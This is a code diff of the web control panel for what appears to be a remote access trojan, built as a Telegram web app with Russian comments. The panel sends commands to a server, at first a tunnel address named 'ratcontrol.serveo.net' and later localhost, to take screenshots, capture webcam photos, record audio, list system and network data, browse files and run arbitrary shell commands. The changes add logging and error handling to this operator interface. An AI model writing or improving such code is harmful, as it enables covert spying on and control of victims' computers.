@@ -380,7 +380,7 @@
 
     <!-- Подключение -->
     <div class="connection-bar">
-        <input type="text" id="serverIP" class="connection-input" placeholder="Адрес сервера" value="ratcontrol.serveo.net">
+        <input type="text" id="serverIP" class="connection-input" placeholder="Адрес сервера" value="localhost:5000">
         <button class="connection-btn" onclick="testConnection()">🔄</button>
     </div>
     <div id="connectionStatus" class="connection-status">⏳ Проверка...</div>
@@ -587,18 +587,23 @@
         tg.expand();
 
         // Настройки
-        let serverAddress = localStorage.getItem('serverAddr') || 'ratcontrol.serveo.net';
+        let serverAddress = localStorage.getItem('serverAddr') || 'localhost:5000';
         let currentDir = 'C:\\';
         document.getElementById('serverIP').value = serverAddress;
 
         // ==================== ОСНОВНЫЕ ФУНКЦИИ ====================
         function getBaseUrl() {
-            let cleanAddress = serverAddress.split(':')[0];
-            let port = serverAddress.includes(':') ? ':' + serverAddress.split(':')[1] : '';
-            return `https://${cleanAddress}${port}`;
+            // Убираем https:// если есть
+            let cleanAddress = serverAddress.replace('https://', '').replace('http://', '');
+            // Если нет порта, добавляем :5000
+            if (!cleanAddress.includes(':')) {
+                cleanAddress = cleanAddress + ':5000';
+            }
+            return `http://${cleanAddress}`;
         }
 
         function showStatus(text, type = 'info') {
+            console.log(`📢 Статус [${type}]: ${text}`);
             const s = document.getElementById('status');
             s.textContent = text;
             s.className = 'status show';
@@ -608,12 +613,21 @@
 
         async function apiRequest(endpoint, method = 'GET', data = null) {
             try {
-                const url = getBaseUrl() + endpoint;
-                console.log('📤 Запрос к:', url);
+                const baseUrl = getBaseUrl();
+                const url = baseUrl + endpoint;
+                
+                console.log('='.repeat(50));
+                console.log('📤 ЗАПРОС К СЕРВЕРУ');
+                console.log('📍 URL:', url);
+                console.log('🔧 Метод:', method);
+                console.log('📦 Данные:', data);
+                console.log('='.repeat(50));
                 
                 const opts = { 
                     method, 
-                    headers: {},
+                    headers: {
+                        'Accept': 'application/json'
+                    },
                     mode: 'cors'
                 };
                 
@@ -623,16 +637,28 @@
                 }
                 
                 const res = await fetch(url, opts);
-                if (!res.ok) throw new Error(`HTTP ${res.status}`);
+                
+                console.log('📥 ОТВЕТ ОТ СЕРВЕРА');
+                console.log('📊 Статус:', res.status, res.statusText);
+                
+                if (!res.ok) {
+                    throw new Error(`HTTP ${res.status}: ${res.statusText}`);
+                }
                 
                 if (endpoint.includes('screenshot') || endpoint.includes('webcam') || endpoint.includes('record_audio')) {
+                    console.log('✅ Получен бинарный файл');
                     return await res.blob();
                 }
                 
-                return await res.json();
+                const json = await res.json();
+                console.log('✅ Получен JSON:', json);
+                return json;
             } catch (e) {
-                console.error('❌ Ошибка API:', e);
-                showStatus('❌ ' + e.message, 'error');
+                console.error('❌ ОШИБКА ЗАПРОСА');
+                console.error('❌ Тип:', e.name);
+                console.error('❌ Сообщение:', e.message);
+                console.error('❌ URL:', getBaseUrl() + endpoint);
+                showStatus(`❌ Ошибка: ${e.message}`, 'error');
                 throw e;
             }
         }
@@ -646,8 +672,11 @@
                     showStatus('✅ OK', 'success');
                     
                     if (cmd === 'system') {
-                        document.getElementById('systemOutput').innerHTML = formatSystem(data.data);
-                        document.getElementById('systemDetailOutput').innerHTML = formatSystem(data.data);
+                        const output = document.getElementById('systemOutput');
+                        const detailOutput = document.getElementById('systemDetailOutput');
+                        const formatted = formatSystem(data.data);
+                        output.innerHTML = formatted;
+                        detailOutput.innerHTML = formatted;
                         updateStats(data.data);
                     } else if (cmd === 'network') {
                         document.getElementById('networkOutput').innerHTML = formatNetwork(data.data);
@@ -800,18 +829,21 @@
             localStorage.setItem('serverAddr', serverAddress);
             
             try {
+                showStatus('⏳ Проверка соединения...');
                 const res = await fetch(getBaseUrl() + '/');
                 const text = await res.text();
+                
                 if (text.includes('✅')) {
-                    document.getElementById('connectionStatus').innerText = '✅ Подключено';
+                    document.getElementById('connectionStatus').innerText = '✅ Подключено к серверу';
                     document.getElementById('connectionText').innerText = 'Онлайн';
                     showStatus('✅ Подключено', 'success');
                     sendCommand('system');
                 } else {
-                    throw new Error('Неверный ответ');
+                    throw new Error('Сервер вернул неожиданный ответ');
                 }
             } catch (e) {
-                document.getElementById('connectionStatus').innerText = '❌ Нет соединения';
+                console.error('Ошибка подключения:', e);
+                document.getElementById('connectionStatus').innerText = '❌ Нет соединения с сервером';
                 document.getElementById('connectionText').innerText = 'Офлайн';
                 showStatus('❌ Ошибка подключения', 'error');
             }
@@ -960,10 +992,9 @@
 
         // ==================== МЕДИАТЕКА ====================
         function showImageInline(url) {
-            console.log('Открываю изображение:', url);
+            console.log('📸 Открываю изображение:', url);
             
             const modal = document.createElement('div');
-            modal.className = 'modal';
             modal.style.cssText = `
                 position: fixed;
                 top: 0;
@@ -1033,8 +1064,9 @@
                 showImageInline(url);
                 showStatus('✅ Скриншот готов', 'success');
                 setTimeout(() => refreshMedia(), 1000);
-            } catch { 
-                showStatus('❌ Ошибка', 'error'); 
+            } catch (e) {
+                console.error('Ошибка скриншота:', e);
+                showStatus('❌ Ошибка скриншота', 'error');
             }
         }
 
@@ -1046,8 +1078,9 @@
                 showImageInline(url);
                 showStatus('✅ Фото готово', 'success');
                 setTimeout(() => refreshMedia(), 1000);
-            } catch { 
-                showStatus('❌ Ошибка', 'error'); 
+            } catch (e) {
+                console.error('Ошибка фото:', e);
+                showStatus('❌ Ошибка фото', 'error');
             }
         }
 
@@ -1058,7 +1091,6 @@
                 const url = URL.createObjectURL(blob);
                 
                 const modal = document.createElement('div');
-                modal.className = 'modal';
                 modal.style.cssText = `
                     position: fixed;
                     top: 0;
@@ -1181,7 +1213,9 @@
         // ==================== КОМАНДЫ ====================
         function runCustomCommand() {
             const cmd = document.getElementById('customCmd').value;
-            if (cmd) sendCommand('cmd', { cmd });
+            if (cmd) {
+                sendCommand('cmd', { cmd });
+            }
         }
 
         function quickCmd(cmd) {
